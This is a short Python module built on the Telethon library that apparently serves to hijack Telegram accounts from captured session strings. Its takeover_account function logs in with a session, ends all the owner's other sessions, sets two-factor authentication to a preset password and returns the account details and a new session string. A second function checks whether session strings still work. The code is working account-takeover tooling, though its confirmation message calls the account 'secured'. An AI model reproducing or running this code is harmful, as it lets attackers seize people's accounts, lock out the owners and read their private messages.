from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.auth import ResetAuthorizationsRequest
import asyncio
from config import API_ID, API_HASH, DEFAULT_PASSWORD

class AccountManager:
    @staticmethod
    async def takeover_account(session_string, phone_number, password=DEFAULT_PASSWORD):
        """Takeover a single account"""
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            if not await client.is_user_authorized():
                await client.disconnect()
                return False, "Invalid session"
            
            me = await client.get_me()
            
            # Terminate other sessions
            await client(ResetAuthorizationsRequest())
            
            # Enable 2FA
            await client.update_2fa(new_password=password)
            
            # Send confirmation
            await client.send_message(
                'me',
                f"🔒 Account Secured!\n✅ Sessions terminated\n✅ 2FA enabled\n🔑 Password: {password}"
            )
            
            new_session = StringSession.save(client.session)
            await client.disconnect()
            
            return True, {
                'phone': me.phone,
                'name': me.first_name,
                'username': me.username,
                'password': password,
                'new_session': new_session
            }
            
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    async def test_session(session_string):
        """Test if session is valid"""
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.start()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                await client.disconnect()
                return True, f"Valid - {me.first_name} (@{me.username})"
            else:
                await client.disconnect()
                return False, "Invalid session"
                
        except Exception as e:
            return False, str(e)
